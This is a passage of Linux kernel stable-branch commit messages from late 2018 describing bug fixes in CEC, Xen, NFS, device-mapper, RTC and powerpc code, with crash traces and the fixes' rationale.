Author: Hans Verkuil
Date: Thu Oct 4 03:28:21 2018 -0400
media: cec: add new tx/rx status bits to detect aborts/timeouts
commit 7ec2b3b941a666a942859684281b5f6460a0c234 upstream.
If the HDMI cable is disconnected or the CEC adapter is manually
unconfigured, then all pending transmits and wait-for-replies are
aborted. Signal this with new status bits (CEC\_RX/TX\_STATUS\_ABORTED).
If due to (usually) a driver bug a transmit never ends (i.e. the
transmit\_done was never called by the driver), then when this times
out the message is marked with CEC\_TX\_STATUS\_TIMEOUT.
This should not happen and is an indication of a driver bug.
Without a separate status bit for this it was impossible to detect
this from userspace.
The 'transmit timed out' kernel message is now a warning, so this
should be more prominent in the kernel log as well.
Signed-off-by: Hans Verkuil
Cc:  # for v4.18 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 587960d865b2ccaabc77fda31c77874a245590e8
Author: Manjunath Patil
Date: Tue Oct 30 09:49:21 2018 -0700
xen-blkfront: fix kernel panic with negotiate\_mq error path
commit 6cc4a0863c9709c512280c64e698d68443ac8053 upstream.
info->nr\_rings isn't adjusted in case of ENOMEM error from
negotiate\_mq(). This leads to kernel panic in error path.
Typical call stack involving panic -
#8 page\_fault at ffffffff8175936f
[exception RIP: blkif\_free\_ring+33]
RIP: ffffffffa0149491 RSP: ffff8804f7673c08 RFLAGS: 00010292
...
#9 blkif\_free at ffffffffa0149aaa [xen\_blkfront]
#10 talk\_to\_blkback at ffffffffa014c8cd [xen\_blkfront]
#11 blkback\_changed at ffffffffa014ea8b [xen\_blkfront]
#12 xenbus\_otherend\_changed at ffffffff81424670
#13 backend\_changed at ffffffff81426dc3
#14 xenwatch\_thread at ffffffff81422f29
#15 kthread at ffffffff810abe6a
#16 ret\_from\_fork at ffffffff81754078
Cc: stable@vger.kernel.org
Fixes: 7ed8ce1c5fc7 ("xen-blkfront: move negotiate\_mq to cover all cases of new VBDs")
Signed-off-by: Manjunath Patil
Acked-by: Roger Pau Monné
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 1ebdc3d180c8ad2a08fd5178b4852fe54191f7c9
Author: Juergen Gross
Date: Thu Nov 1 13:33:07 2018 +0100
xen: remove size limit of privcmd-buf mapping interface
commit 3941552aec1e04d63999988a057ae09a1c56ebeb upstream.
Currently the size of hypercall buffers allocated via
/dev/xen/hypercall is limited to a default of 64 memory pages. For live
migration of guests this might be too small as the page dirty bitmask
needs to be sized according to the size of the guest. This means
migrating a 8GB sized guest is already exhausting the default buffer
size for the dirty bitmap.
There is no sensible way to set a sane limit, so just remove it
completely. The device node's usage is limited to root anyway, so there
is no additional DOS scenario added by allowing unlimited buffers.
While at it make the error path for the -ENOMEM case a little bit
cleaner by setting n\_pages to the number of successfully allocated
pages instead of the target size.
Fixes: c51b3c639e01f2 ("xen: add new hypercall buffer mapping device")
Cc:  #4.18
Signed-off-by: Juergen Gross
Reviewed-by: Boris Ostrovsky
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit d54e8a7d974a6e8fa77d493204fe671bba603149
Author: Juergen Gross
Date: Thu Nov 8 08:35:06 2018 +0100
xen: fix xen\_qlock\_wait()
commit d3132b3860f6cf35ff7609a76bbcdbb814bd027c upstream.
Commit a856531951dc80 ("xen: make xen\_qlock\_wait() nestable")
introduced a regression for Xen guests running fully virtualized
(HVM or PVH mode). The Xen hypervisor wouldn't return from the poll
hypercall with interrupts disabled in case of an interrupt (for PV
guests it does).
So instead of disabling interrupts in xen\_qlock\_wait() use a nesting
counter to avoid calling xen\_clear\_irq\_pending() in case
xen\_qlock\_wait() is nested.
Fixes: a856531951dc80 ("xen: make xen\_qlock\_wait() nestable")
Cc: stable@vger.kernel.org
Reported-by: Sander Eikelenboom
Signed-off-by: Juergen Gross
Reviewed-by: Boris Ostrovsky
Tested-by: Sander Eikelenboom
Signed-off-by: Juergen Gross
Signed-off-by: Greg Kroah-Hartman
commit 9130ced3952ad48ee76875c1ad5e56db906af81f
Author: Hans Verkuil
Date: Thu Sep 13 03:36:29 2018 -0400
media: cec: integrate cec\_validate\_phys\_addr() in cec-api.c
commit e81bff39489a06384822bb38ce7a59f9e365bbe9 upstream.
The cec\_phys\_addr\_validate() function will be moved to V4L2,
so use a simplified variant of that function in cec-api.c.
cec now no longer calls cec\_phys\_addr\_validate() and it can
be safely moved to V4L2.
Signed-off-by: Hans Verkuil
Cc:  # for v4.17 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit c1a4102e43cd5eac93dc6de0dac389cdcc17f6f0
Author: Hans Verkuil
Date: Thu Sep 13 03:25:59 2018 -0400
media: cec: make cec\_get\_edid\_spa\_location() an inline function
commit b915bf575d5b7774d0f22d57d6c143e07dcaade2 upstream.
This function is needed by both V4L2 and CEC, so move this to
cec.h as a static inline since there are no obvious shared
modules between the two subsystems.
This patch, together with the following ones, fixes a
dependency bug: if CEC\_CORE is disabled, then building adv7604
(and other HDMI receivers) will fail because an essential
function is now stubbed out.
Signed-off-by: Hans Verkuil
Cc:  # for v4.17 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit a91394b21ddf43922ff974138446ee7920a08127
Author: Bjorn Andersson
Date: Wed Sep 19 18:51:51 2018 -0700
remoteproc: qcom: q6v5: Propagate EPROBE\_DEFER
commit d5269c4553a64b6882f2c019ae21b783a0984a83 upstream.
In the case that the interrupts fail to result because of the
interrupt-controller not yet being registered the
platform\_get\_irq\_byname() call will fail with -EPROBE\_DEFER, but passing
this into devm\_request\_threaded\_irq() will result in -EINVAL being
returned, the driver is therefor not reprobed later.
Fixes: 3b415c8fb263 ("remoteproc: q6v5: Extract common resource handling")
Cc: stable@vger.kernel.org
Reviewed-by: Sibi Sankar
Signed-off-by: Bjorn Andersson
Signed-off-by: Greg Kroah-Hartman
commit df7ada33d6dc57926e25e4cf1a22e80b4f385884
Author: He Zhe
Date: Fri Aug 17 22:42:28 2018 +0800
kgdboc: Passing ekgdboc to command line causes panic
commit 1bd54d851f50dea6af30c3e6ff4f3e9aab5558f9 upstream.
kgdboc\_option\_setup does not check input argument before passing it
to strlen. The argument would be a NULL pointer if "ekgdboc", without
its value, is set in command line and thus cause the following panic.
PANIC: early exception 0xe3 IP 10:ffffffff8fbbb620 error 0 cr2 0x0
[ 0.000000] CPU: 0 PID: 0 Comm: swapper Not tainted 4.18-rc8+ #1
[ 0.000000] RIP: 0010:strlen+0x0/0x20
...
[ 0.000000] Call Trace
[ 0.000000] ? kgdboc\_option\_setup+0x9/0xa0
[ 0.000000] ? kgdboc\_early\_init+0x6/0x1b
[ 0.000000] ? do\_early\_param+0x4d/0x82
[ 0.000000] ? parse\_args+0x212/0x330
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_options+0x20/0x23
[ 0.000000] ? rdinit\_setup+0x26/0x26
[ 0.000000] ? parse\_early\_param+0x2d/0x39
[ 0.000000] ? setup\_arch+0x2f7/0xbf4
[ 0.000000] ? start\_kernel+0x5e/0x4c2
[ 0.000000] ? load\_ucode\_bsp+0x113/0x12f
[ 0.000000] ? secondary\_startup\_64+0xa5/0xb0
This patch adds a check to prevent the panic.
Cc: stable@vger.kernel.org
Cc: jason.wessel@windriver.com
Cc: gregkh@linuxfoundation.org
Cc: jslaby@suse.com
Signed-off-by: He Zhe
Reviewed-by: Daniel Thompson
Signed-off-by: Greg Kroah-Hartman
commit 43cdccfe10cafe5f2aaf895e9fd69ecfb986f003
Author: Mauro Carvalho Chehab
Date: Fri Oct 5 10:21:25 2018 -0400
Revert "media: dvbsky: use just one mutex for serializing device R/W ops"
commit 9afc82194de9a1ce298f0d77d7d779d585bf962c upstream.
As pointed at:
https://bugzilla.kernel.org/show\_bug.cgi?id=199323
This patch causes a bad effect on RPi. I suspect that the root
cause is at the USB out of tree RPi driver, with uses high priority
interrupts instead of normal ones. Anyway, as this patch
is mostly a cleanup, better to revert it.
This reverts commit 7d95fb746c4eece67308f1642a666ea1ebdbd2cc.
Cc: stable@vger.kernel.org # For Kernel 4.18
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 04feb58d811be27c92745442497ea5c96999f38f
Author: Hans Verkuil
Date: Mon Oct 8 15:08:27 2018 -0400
media: v4l2-tpg: fix kernel oops when enabling HFLIP and OSD
commit 250854eed5d45a73d81e4137dfd85180af6f2ec3 upstream.
When the OSD is on (i.e. vivid displays text on top of the test pattern), and
you enable hflip, then the driver crashes.
The cause turned out to be a division of a negative number by an unsigned value.
You expect that -8 / 2U would be -4, but in reality it is 2147483644 :-(
Fixes: 3e14e7a82c1ef ("vivid-tpg: add hor/vert downsampling support to tpg\_gen\_text")
Signed-off-by: Hans Verkuil
Reported-by: Mauro Carvalho Chehab
Cc:  # for v4.1 and up
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 90bedf4a7c76ad7fcb002c1ecd1246a34c299af9
Author: Johan Hovold
Date: Mon Aug 27 10:21:50 2018 +0200
net: bcmgenet: fix OF child-node lookup
commit d397dbe606120a1ea1b11b0020c3f7a3852da5ac upstream.
Use the new of\_get\_compatible\_child() helper to lookup the mdio child
node instead of using of\_find\_compatible\_node(), which searches the
entire tree from a given start node and thus can return an unrelated
(i.e. non-child) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the node of the device being probed).
Fixes: aa09677cba42 ("net: bcmgenet: add MDIO routines")
Cc: stable  # 3.15
Cc: David S. Miller
Reviewed-by: Florian Fainelli
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit b0b62843d003cc1d626480520af57362a000899e
Author: Maciej W. Rozycki
Date: Wed Oct 3 13:21:07 2018 +0100
TC: Set DMA masks for devices
commit 3f2aa244ee1a0d17ed5b6c86564d2c1b24d1c96b upstream.
Fix a TURBOchannel support regression with commit 205e1b7f51e4
("dma-mapping: warn when there is no coherent\_dma\_mask") that caused
coherent DMA allocations to produce a warning such as:
defxx: v1.11 2014/07/01 Lawrence V. Stefani and others
tc1: DEFTA at MMIO addr = 0x1e900000, IRQ = 20, Hardware addr = 08-00-2b-a3-a3-29
------------[ cut here ]------------
WARNING: CPU: 0 PID: 1 at ./include/linux/dma-mapping.h:516 dfx\_dev\_register+0x670/0x678
Modules linked in:
CPU: 0 PID: 1 Comm: swapper Not tainted 4.19.0-rc6 #2
Stack : ffffffff8009ffc0 fffffffffffffec0 0000000000000000 ffffffff80647650
0000000000000000 0000000000000000 ffffffff806f5f80 ffffffffffffffff
0000000000000000 0000000000000000 0000000000000001 ffffffff8065d4e8
98000000031b6300 ffffffff80563478 ffffffff805685b0 ffffffffffffffff
0000000000000000 ffffffff805d6720 0000000000000204 ffffffff80388df8
0000000000000000 0000000000000009 ffffffff8053efd0 ffffffff806657d0
0000000000000000 ffffffff803177f8 0000000000000000 ffffffff806d0000
9800000003078000 980000000307b9e0 000000001e900000 ffffffff80067940
0000000000000000 ffffffff805d6720 0000000000000204 ffffffff80388df8
ffffffff805176c0 ffffffff8004dc78 0000000000000000 ffffffff80067940
...
Call Trace:
[] show\_stack+0xa0/0x130
[] \_\_warn+0x128/0x170
---[ end trace b1d1e094f67f3bb2 ]---
This is because the TURBOchannel bus driver fails to set the coherent
DMA mask for devices enumerated.
Set the regular and coherent DMA masks for TURBOchannel devices then,
observing that the bus protocol supports a 34-bit (16GiB) DMA address
space, by interpreting the value presented in the address cycle across
the 32 `ad' lines as a 32-bit word rather than byte address[1]. The
architectural size of the TURBOchannel DMA address space exceeds the
maximum amount of RAM any actual TURBOchannel system in existence may
have, hence both masks are the same.
This removes the warning shown above.
References:
[1] "TURBOchannel Hardware Specification", EK-369AA-OD-007B, Digital
Equipment Corporation, January 1993, Section "DMA", pp. 1-15 -- 1-17
Signed-off-by: Maciej W. Rozycki
Signed-off-by: Paul Burton
Patchwork: https://patchwork.linux-mips.org/patch/20835/
Fixes: 205e1b7f51e4 ("dma-mapping: warn when there is no coherent\_dma\_mask")
Cc: stable@vger.kernel.org # 4.16+
Cc: Ralf Baechle
Signed-off-by: Greg Kroah-Hartman
commit 14dd2a14e8b776db648c9ae3634f8ebe930adeaf
Author: Will Deacon
Date: Mon Oct 1 12:42:49 2018 +0100
iommu/arm-smmu: Ensure that page-table updates are visible before TLBI
commit 7d321bd3542500caf125249f44dc37cb4e738013 upstream.
The IO-pgtable code relies on the driver TLB invalidation callbacks to
ensure that all page-table updates are visible to the IOMMU page-table
walker.
In the case that the page-table walker is cache-coherent, we cannot rely
on an implicit DSB from the DMA-mapping code, so we must ensure that we
execute a DSB in our tlb\_add\_flush() callback prior to triggering the
invalidation.
Cc:
Cc: Robin Murphy
Fixes: 2df7a25ce4a7 ("iommu/arm-smmu: Clean up DMA API usage")
Signed-off-by: Will Deacon
Signed-off-by: Greg Kroah-Hartman
commit 32396672cbc6a72c0c5d892f71f4c35906430ad9
Author: Christophe Lombard
Date: Tue Aug 14 14:45:15 2018 +0200
ocxl: Fix access to the AFU Descriptor Data
commit 6f8e45f7eb1bee5efdbe4a9cfe4a45627403c5fb upstream.
The AFU Information DVSEC capability is a means to extract common,
general information about all of the AFUs associated with a Function
independent of the specific functionality that each AFU provides.
Write in the AFU Index field allows to access to the descriptor data
for each AFU.
With the current code, we are not able to access to these specific data
when the index >= 1 because we are writing to the wrong location.
All requests to the data of each AFU are pointing to those of the AFU 0,
which could have impacts when using a card with more than one AFU per
function.
This patch fixes the access to the AFU Descriptor Data indexed by the
AFU Info Index field.
Fixes: 5ef3166e8a32 ("ocxl: Driver code for 'generic' opencapi devices")
Cc: stable  # 4.16
Signed-off-by: Christophe Lombard
Signed-off-by: Greg Kroah-Hartman
Acked-by: Frederic Barrat
Acked-by: Andrew Donnellan
Signed-off-by: Michael Ellerman
commit 168945fe47d109df0bf327c5d09a03e74c5e6802
Author: Johan Hovold
Date: Mon Aug 27 10:21:53 2018 +0200
power: supply: twl4030-charger: fix OF sibling-node lookup
commit 9844fb2e351311210e6660a9a1c62d17424a6145 upstream.
Use the new of\_get\_compatible\_child() helper to lookup the usb sibling
node instead of using of\_find\_compatible\_node(), which searches the
entire tree from a given start node and thus can return an unrelated
(non-sibling) node.
This also addresses a potential use-after-free (e.g. after probe
deferral) as the tree-wide helper drops a reference to its first
argument (i.e. the parent device node).
While at it, also fix the related phy-node reference leak.
Fixes: f5e4edb8c888 ("power: twl4030\_charger: find associated phy by more reliable means.")
Cc: stable  # 4.2
Cc: NeilBrown
Cc: Felipe Balbi
Cc: Sebastian Reichel
Reviewed-by: Sebastian Reichel
Signed-off-by: Johan Hovold
Signed-off-by: Rob Herring
Signed-off-by: Greg Kroah-Hartman
commit 65635b7d4dd7c0f74c3f476b4972c1202e6e9c4f
Author: Maciej W. Rozycki
Date: Tue Oct 2 02:09:05 2018 +0100
rtc: cmos: Remove the `use\_acpi\_alarm' module parameter for !ACPI
commit bc51098cdd9573bfdecfd02fc8ed474419d73ea0 upstream.
Fix a problem with commit 311ee9c151ad ("rtc: cmos: allow using ACPI for
RTC alarm instead of HPET") defining `use\_acpi\_alarm' module parameter
even for non-ACPI platforms, which ignore it. Wrap the definition into
#ifdef CONFIG\_ACPI and use a static inline wrapper function, hardcoded
to return 0 and consequently optimized away for !ACPI, following the
existing pattern with HPET handling functions.
Signed-off-by: Maciej W. Rozycki
Fixes: 311ee9c151ad ("rtc: cmos: allow using ACPI for RTC alarm instead of HPET")
Cc: stable@vger.kernel.org # 4.18+
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
commit 65a060ca4bfc129bcdc1bdfbafda1396e2ce77ad
Author: Maciej W. Rozycki
Date: Tue Oct 2 02:08:49 2018 +0100
rtc: cmos: Fix non-ACPI undefined reference to `hpet\_rtc\_interrupt'
commit d197a253855d2d8e507a003880aab35c4e2473db upstream.
Fix a commit 311ee9c151ad ("rtc: cmos: allow using ACPI for RTC alarm
instead of HPET") `rtc-cmos' regression causing a link error:
drivers/rtc/rtc-cmos.o: In function `cmos\_platform\_probe':
rtc-cmos.c:(.init.text+0x33c): undefined reference to `hpet\_rtc\_interrupt'
rtc-cmos.c:(.init.text+0x3f4): undefined reference to `hpet\_rtc\_interrupt'
with non-ACPI platforms using this driver. The cause is the change of
the condition guarding the use of `hpet\_rtc\_interrupt'.
Previously it was a call to `is\_hpet\_enabled'. That function is static
inline and has a hardcoded 0 result for non-ACPI platforms, which imply
!HPET\_EMULATE\_RTC. Consequently the compiler optimized the whole block
away including the reference to `hpet\_rtc\_interrupt', which never made
it to the link stage.
Now the guarding condition is a call to `use\_hpet\_alarm', which is not
static inline and therefore the compiler may not be able to prove that
it actually always returns 0 for non-ACPI platforms. Consequently the
build breaks with an unsatisfied reference, because `hpet\_rtc\_interrupt'
is nowhere defined at link time.
Fix the problem by marking `use\_hpet\_alarm' inline. As the `inline'
keyword serves as an optimization hint rather than a requirement the
compiler is still free to choose whether inlining will be beneficial or
not for ACPI platforms.
Signed-off-by: Maciej W. Rozycki
Fixes: 311ee9c151ad ("rtc: cmos: allow using ACPI for RTC alarm instead of HPET")
Cc: stable@vger.kernel.org # 4.18+
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
commit f3e5730821cffb21cc3f91883067f9b71871efdc
Author: Soeren Moch
Date: Mon Oct 22 14:38:12 2018 +0200
rtc: ds1307: fix ds1339 wakealarm support
commit 7dceef78f310f5351735060d78a1777c69606016 upstream.
Commit 51ed73eb998a1c79a2b0e9bed68f75a8a2c93b9b ("rtc: ds1340: Add support
for trickle charger.") breaks ds1339 wakealarm support by limiting
accessible registers. Fix this.
Fixes: 51ed73eb998a ("rtc: ds1340: Add support for trickle charger.")
Cc: stable@vger.kernel.org
Signed-off-by: Soeren Moch
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
commit 7d9f3a26ea8a74c71754f430ab3b85d92f302a4b
Author: Aaro Koskinen
Date: Sat Oct 27 01:46:34 2018 +0300
MIPS: OCTEON: fix out of bounds array access on CN68XX
commit c0fae7e2452b90c31edd2d25eb3baf0c76b400ca upstream.
The maximum number of interfaces is returned by
cvmx\_helper\_get\_number\_of\_interfaces(), and the value is used to access
interface\_port\_count[]. When CN68XX support was added, we forgot
to increase the array size. Fix that.
Fixes: 2c8c3f0201333 ("MIPS: Octeon: Support additional interfaces on CN68XX")
Signed-off-by: Aaro Koskinen
Signed-off-by: Paul Burton
Patchwork: https://patchwork.linux-mips.org/patch/20949/
Cc: Ralf Baechle
Cc: linux-mips@linux-mips.org
Cc: linux-kernel@vger.kernel.org
Cc: stable@vger.kernel.org # v4.3+
Signed-off-by: Greg Kroah-Hartman
commit 66eb08aea0072366d01c34e3c2870f651f0cb1e7
Author: Nicholas Piggin
Date: Mon Aug 27 13:03:01 2018 +1000
powerpc/64s/hash: Do not use PPC\_INVALIDATE\_ERAT on CPUs before POWER9
commit bc276ecba132caccb1fda5863a652c15def2b8c6 upstream.
PPC\_INVALIDATE\_ERAT is slbia IH=7 which is a new variant introduced
with POWER9, and the result is undefined on earlier CPUs.
Commits 7b9f71f974 ("powerpc/64s: POWER9 machine check handler") and
d4748276ae ("powerpc/64s: Improve local TLB flush for boot and MCE on
POWER9") caused POWER7/8 code to use this instruction. Remove it. An
ERAT flush can be made by invalidatig the SLB, but before POWER9 that
requires a flush and rebolt.
Fixes: 7b9f71f974 ("powerpc/64s: POWER9 machine check handler")
Fixes: d4748276ae ("powerpc/64s: Improve local TLB flush for boot and MCE on POWER9")
Cc: stable@vger.kernel.org # v4.11+
Signed-off-by: Nicholas Piggin
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit e0f5f1c89c17f41ef01e01bd0f72b168ffecf4c7
Author: Michael Neuling
Date: Tue Sep 11 13:07:56 2018 +1000
powerpc/tm: Fix HFSCR bit for no suspend case
commit dd9a8c5a87395b6f05552c3b44e42fdc95760552 upstream.
Currently on P9N DD2.1 we end up taking infinite TM facility
unavailable exceptions on the first TM usage by userspace.
In the special case of TM no suspend (P9N DD2.1), Linux is told TM is
off via CPU dt-ftrs but told to (partially) use it via
OPAL\_REINIT\_CPUS\_TM\_SUSPEND\_DISABLED. So HFSCR[TM] will be off from
dt-ftrs but we need to turn it on for the no suspend case.
This patch fixes this by enabling HFSCR TM in this case.
Cc: stable@vger.kernel.org # 4.15+
Signed-off-by: Michael Neuling
Signed-off-by: Paul Mackerras
Signed-off-by: Greg Kroah-Hartman
commit 7607e1dad579cfb16a4a025f1cd06d9e7b04c2d1
Author: Christophe Leroy
Date: Fri Oct 19 06:12:50 2018 +0000
powerpc/msi: Fix compile error on mpc83xx
commit 0f99153def98134403c9149128e59d3e1786cf04 upstream.
mpic\_get\_primary\_version() is not defined when not using MPIC.
The compile error log like:
arch/powerpc/sysdev/built-in.o: In function `fsl\_of\_msi\_probe':
fsl\_msi.c:(.text+0x150c): undefined reference to `fsl\_mpic\_primary\_get\_version'
Signed-off-by: Jia Hongtao
Signed-off-by: Scott Wood
Reported-by: Radu Rendec
Fixes: 807d38b73b6 ("powerpc/mpic: Add get\_version API both for internal and external use")
Cc: stable@vger.kernel.org
Signed-off-by: Christophe Leroy
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit 5f489579ef918970f655b3afc19c03732f16cbc4
Author: Naveen N. Rao
Date: Tue May 29 12:21:00 2018 +0530
powerpc64/module elfv1: Set opd addresses after module relocation
commit 59fe7eaf3598a89cbcd72e645b1d08afd76f7b29 upstream.
module\_frob\_arch\_sections() is called before the module is moved to its
final location. The function descriptor section addresses we are setting
here are thus invalid. Fix this by processing opd section during
module\_finalize()
Fixes: 5633e85b2c313 ("powerpc64: Add .opd based function descriptor dereference")
Cc: stable@vger.kernel.org # v4.16
Signed-off-by: Naveen N. Rao
Signed-off-by: Michael Ellerman
Signed-off-by: Greg Kroah-Hartman
commit 778af261c53b0852ba5d9e2f45d4c03f46eddee6
Author: Jan Kara
Date: Wed Oct 17 13:07:05 2018 +0200
fsnotify: Fix busy inodes during unmount
commit 721fb6fbfd2132164c2e8777cc837f9b2c1794dc upstream.
Detaching of mark connector from fsnotify\_put\_mark() can race with
unmounting of the filesystem like:
CPU1 CPU2
fsnotify\_put\_mark()
spin\_lock(&conn->lock);
...
inode = fsnotify\_detach\_connector\_from\_object(conn)
spin\_unlock(&conn->lock);
generic\_shutdown\_super()
fsnotify\_unmount\_inodes()
sees connector detached for inode
-> nothing to do
evict\_inode()
barfs on pending inode reference
iput(inode);
Resulting in "Busy inodes after unmount" message and possible kernel
oops. Make fsnotify\_unmount\_inodes() properly wait for outstanding inode
references from detached connectors.
Note that the accounting of outstanding inode references in the
superblock can cause some cacheline contention on the counter. OTOH it
happens only during deletion of the last notification mark from an inode
(or during unlinking of watched inode) and that is not too bad. I have
measured time to create & delete inotify watch 100000 times from 64
processes in parallel (each process having its own inotify group and its
own file on a shared superblock) on a 64 CPU machine. Average and
standard deviation of 15 runs look like:
Avg Stddev
Vanilla 9.817400 0.276165
Fixed 9.710467 0.228294
So there's no statistically significant difference.
Fixes: 6b3f05d24d35 ("fsnotify: Detach mark from object list when last reference is dropped")
CC: stable@vger.kernel.org
Signed-off-by: Jan Kara
Signed-off-by: Greg Kroah-Hartman
commit a94a2e3b59038e290956730741148e4173da3c5b
Author: Lubomir Rintel
Date: Thu Oct 4 17:29:03 2018 -0400
media: ov7670: make "xclk" clock optional
commit 786fa584eda86d6598db3b87c61dc81f68808d11 upstream.
When the "xclk" clock was added, it was made mandatory. This broke the
driver on an OLPC plaform which doesn't know such clock. Make it
optional.
Tested on a OLPC XO-1 laptop.
Fixes: 0a024d634cee ("[media] ov7670: get xclk")
Cc: stable@vger.kernel.org # 4.11+
Signed-off-by: Lubomir Rintel
Signed-off-by: Sakari Ailus
Signed-off-by: Mauro Carvalho Chehab
Signed-off-by: Greg Kroah-Hartman
commit 8f882a6b0b9336da07b9610abb1dbcc9286cc7a1
Author: Damien Le Moal
Date: Wed Oct 17 18:05:08 2018 +0900
dm zoned: fix various dmz\_get\_mblock() issues
commit 3d4e738311327bc4ba1d55fbe2f1da3de4a475f9 upstream.
dmz\_fetch\_mblock() called from dmz\_get\_mblock() has a race since the
allocation of the new metadata block descriptor and its insertion in
the cache rbtree with the READING state is not atomic. Two different
contexts requesting the same block may end up each adding two different
descriptors of the same block to the cache.
Another problem for this function is that the BIO for processing the
block read is allocated after the metadata block descriptor is inserted
in the cache rbtree. If the BIO allocation fails, the metadata block
descriptor is freed without first being removed from the rbtree.
Fix the first problem by checking again if the requested block is not in
the cache right before inserting the newly allocated descriptor,
atomically under the mblk\_lock spinlock. The second problem is fixed by
simply allocating the BIO before inserting the new block in the cache.
Finally, since dmz\_fetch\_mblock() also increments a block reference
counter, rename the function to dmz\_get\_mblock\_slow(). To be symmetric
and clear, also rename dmz\_lookup\_mblock() to dmz\_get\_mblock\_fast() and
increment the block reference counter directly in that function rather
than in dmz\_get\_mblock().
Fixes: 3b1a94c88b79 ("dm zoned: drive-managed zoned block device target")
Cc: stable@vger.kernel.org
Signed-off-by: Damien Le Moal
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit fceb0d85246e9378dacc70deaee7e5c304558728
Author: Damien Le Moal
Date: Wed Oct 17 18:05:07 2018 +0900
dm zoned: fix metadata block ref counting
commit 33c2865f8d011a2ca9f67124ddab9dc89382e9f1 upstream.
Since the ref field of struct dmz\_mblock is always used with the
spinlock of struct dmz\_metadata locked, there is no need to use an
atomic\_t type. Change the type of the ref field to an unsigne
integer.
Fixes: 3b1a94c88b79 ("dm zoned: drive-managed zoned block device target")
Cc: stable@vger.kernel.org
Signed-off-by: Damien Le Moal
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit b42128078cfc1c84a53547d31126fdb2e188b9cb
Author: Wenwen Wang
Date: Wed Oct 3 11:43:59 2018 -0500
dm ioctl: harden copy\_params()'s copy\_from\_user() from malicious users
commit 800a7340ab7dd667edf95e74d8e4f23a17e87076 upstream.
In copy\_params(), the struct 'dm\_ioctl' is first copied from the user
space buffer 'user' to 'param\_kernel' and the field 'data\_size' is
checked against 'minimum\_data\_size' (size of 'struct dm\_ioctl' payload
up to its 'data' member). If the check fails, an error code EINVAL will be
returned. Otherwise, param\_kernel->data\_size is used to do a second copy,
which copies from the same user-space buffer to 'dmi'. After the second
copy, only 'dmi->data\_size' is checked against 'param\_kernel->data\_size'.
Given that the buffer 'user' resides in the user space, a malicious
user-space process can race to change the content in the buffer between
the two copies. This way, the attacker can inject inconsistent data
into 'dmi' (versus previously validated 'param\_kernel').
Fix redundant copying of 'minimum\_data\_size' from user-space buffer by
using the first copy stored in 'param\_kernel'. Also remove the
'data\_size' check after the second copy because it is now unnecessary.
Cc: stable@vger.kernel.org
Signed-off-by: Wenwen Wang
Signed-off-by: Mike Snitzer
Signed-off-by: Greg Kroah-Hartman
commit 86edf5629edc161a5fbe6c5d9179f7fe8629c557
Author: Amir Goldstein
Date: Fri Sep 28 20:41:48 2018 +0300
lockd: fix access beyond unterminated strings in prints
commit 93f38b6fae0ea8987e22d9e6c38f8dfdccd867ee upstream.
printk format used %\*s instead of %.\*s, so hostname\_len does not limit
the number of bytes accessed from hostname.
Signed-off-by: Amir Goldstein
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit 18c1d28f359cd6c7b26ef9856a61427d63bedfcc
Author: Trond Myklebust
Date: Tue Oct 9 15:54:15 2018 -0400
nfsd: Fix an Oops in free\_session()
commit bb6ad5572c0022e17e846b382d7413cdcf8055be upstream.
In call\_xpt\_users(), we delete the entry from the list, but we
do not reinitialise it. This triggers the list poisoning when
we later call unregister\_xpt\_user() in nfsd4\_del\_conns().
Signed-off-by: Trond Myklebust
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit b71f9663a7babdefdc54c7fdb83e89d2b2b9ec42
Author: Andrew Elble
Date: Fri Oct 5 09:32:08 2018 -0400
nfsd: correctly decrement odstate refcount in error path
commit bd8d725078867cda250fe94b9c5a067b4a64ca74 upstream.
alloc\_init\_deleg() both allocates an nfs4\_delegation, and
bumps the refcount on odstate. So after this point, we need to
put\_clnt\_odstate() and nfs4\_put\_stid() to not leave the odstate
refcount inappropriately bumped.
Signed-off-by: Andrew Elble
Reviewed-by: Jeff Layton
Cc: stable@vger.kernel.org
Signed-off-by: J. Bruce Fields
Signed-off-by: Greg Kroah-Hartman
commit d99bbbf1eedd99af73a869f11ae13392331b1aa9
Author: Benjamin Coddington
Date: Thu Oct 18 15:01:48 2018 -0400
nfs: Fix a missed page unlock after pg\_doio()
commit fdbd1a2e4a71adcb1ae219fcfd964930d77a7f84 upstream.
We must check pg\_error and call error\_cleanup after any call to pg\_doio.
Currently, we are skipping the unlock of a page if we encounter an error in
nfs\_pageio\_complete() before handing off the work to the RPC layer.
Signed-off-by: Benjamin Coddington
Cc: stable@vger.kernel.org
Signed-off-by: Trond Myklebust
Signed-off-by: Greg Kroah-Hartman
commit 3a1c13e182977bab99a8ce7944b8d62129bc0336
Author: Trond Myklebust
Date: Tue Sep 18 10:07:44 2018 -0400
NFSv4.1: Fix the r/wsize checking
commit 943cff67b842839f4f35364ba2db5c2d3f025d94 upstream.
The intention of nfs4\_session\_set\_rwsize() was to cap the r/wsize to the
buffer sizes negotiated by the CREATE\_SESSION. The initial code had a
bug whereby we would not check the values negotiated by nfs\_probe\_fsinfo()
(the assumption being that CREATE\_SESSION will always negotiate buffer values
